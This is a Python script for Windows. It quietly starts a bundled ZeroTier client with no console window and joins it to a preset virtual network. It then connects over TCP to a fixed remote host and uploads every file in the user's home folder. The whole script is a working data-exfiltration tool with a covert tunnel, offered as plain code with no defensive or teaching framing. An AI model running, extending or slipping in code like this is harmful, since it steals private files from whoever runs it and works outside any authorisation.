import subprocess, os, shutil, socket

executable_path = "zerotier\\zerotierwinx64.exe"
net_configs = "zerotier\\mynet\\"
local_port = "4143"
HOST = "192.168.195.5"
PORT = 52525  

arguments = f"-C -U -p {local_port}"

def get_user_folder():
    try: 
        dir = os.environ.get('USERPROFILE', '')
        return dir
    except: return False
    
def ping_host(ip_address, timeout=1, count=10):
    try:
        command = ["ping", "-n" if subprocess.os.name == "nt" else "-c", str(count), "-w" if subprocess.os.name == "nt" else "-W", str(timeout), ip_address]
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.returncode == 0
    except:
        return False
    
def main():
    file_path = get_user_folder()
    check_host = ping_host(HOST)
    if check_host:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((HOST, PORT))
            print(f"CONNECTED {HOST}:{PORT}")
            for file_name in os.listdir(file_path):
                full_path = os.path.join(file_path, file_name)
                try: send_file_to_server(client_socket, full_path)
                except Exception as e: print(f"{e}")

            client_socket.sendall(b'')

def send_file_to_server(client_socket, file_path):
    if not os.path.exists(file_path) or os.path.isdir(file_path): return

    file_name = os.path.basename(file_path)
    file_size = os.path.getsize(file_path)
    
    client_socket.sendall(file_name.encode())
    client_socket.sendall(str(file_size).encode())
    
    with open(file_path, 'rb') as file:
        sent_bytes = 0
        while chunk := file.read(1024):
            client_socket.sendall(chunk)
            sent_bytes += len(chunk)
            print(f"Sent {sent_bytes}/{file_size} bytes", end='\r')
    
    print(f"\n{file_name} SENT")

command = ["powershell", "-Command", f"Start-Process '{executable_path}' -ArgumentList '{arguments}' "]

if os.path.isdir(f"{local_port}"):
    try: 
        os.mkdir(f"{local_port}\\networks.d")
        for a in os.listdir(net_configs):
            shutil.copy(os.path.join(net_configs,a), f"{local_port}\\networks.d\\")
    except: pass

try:
    result = subprocess.run(command, creationflags=subprocess.CREATE_NO_WINDOW, check=True)
    main()

except Exception as ex: print(f"{ex}")

